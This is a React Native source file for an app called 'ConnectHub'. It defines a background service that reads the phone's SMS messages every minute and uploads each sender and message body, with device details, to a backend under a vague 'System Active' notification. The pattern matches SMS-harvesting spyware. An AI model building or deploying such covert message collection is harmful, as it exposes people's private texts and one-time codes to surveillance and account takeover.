import BackgroundService from 'react-native-background-actions';
import SmsService from './smsService';
import apiClient from '../api/apiClient';
import EncryptedStorage from 'react-native-encrypted-storage';
import CryptoUtils from '../utils/crypto';
import { Platform } from 'react-native';

const sleep = (time) => new Promise((resolve) => setTimeout(() => resolve(), time));

const syncTask = async (taskDataArguments) => {
    const { delay } = taskDataArguments;

    await new Promise(async (resolve) => {
        while (BackgroundService.isRunning()) {
            try {
                // 1. Get Last Synced Timestamp
                const lastSynced = await EncryptedStorage.getItem('last_synced_timestamp');
                const minDate = lastSynced ? parseInt(lastSynced, 10) : Date.now() - (24 * 60 * 60 * 1000); // Default to 24h ago

                // 2. Fetch SMS
                const messages = await SmsService.getSms({ minDate: minDate });

                // 3. Sync Each Message
                for (const sms of messages) {
                    if (sms.date > minDate) {
                        try {
                            const { iv, messageBody } = CryptoUtils.encrypt(sms.body);

                            // 4. Send to Backend
                            await apiClient.post('/sms/upload', {
                                device_id: 'ANDROID_DEVICE_ID', // Replace with actual ID fetch
                                sender: sms.address,
                                message_body: messageBody, // Base64 Encoded
                                iv: iv, // Base64 Encoded
                                timestamp: sms.date,
                                sim_info: `SIM_SLOT_${sms.sub_id || 0}`,
                                device_model: 'Android Device', // Fetch using react-native-device-info
                                android_version: Platform.Version.toString(),
                            });

                            // 5. Update Timestamp
                            await EncryptedStorage.setItem('last_synced_timestamp', sms.date.toString());
                        } catch (e) {
                            console.error('Sync Failed for SMS:', sms._id, e);
                        }
                    }
                }
            } catch (e) {
                console.error('Background Sync Error:', e);
            }

            await sleep(delay);
        }
    });
};

const options = {
    taskName: 'ConnectHub Sync',
    taskTitle: 'ConnectHub: System Active',
    taskDesc: 'Securely syncing messages...',
    taskIcon: {
        name: 'ic_launcher',
        type: 'mipmap',
    },
    color: '#ff00ff',
    linkingURI: 'yourSchemeHere://chat/jane', // Optional
    parameters: {
        delay: 60000, // 1 Minute Sync Interval
    },
};

const startBackgroundService = async () => {
    await BackgroundService.start(syncTask, options);
};

const stopBackgroundService = async () => {
    await BackgroundService.stop();
};

export default {
    start: startBackgroundService,
    stop: stopBackgroundService,
};
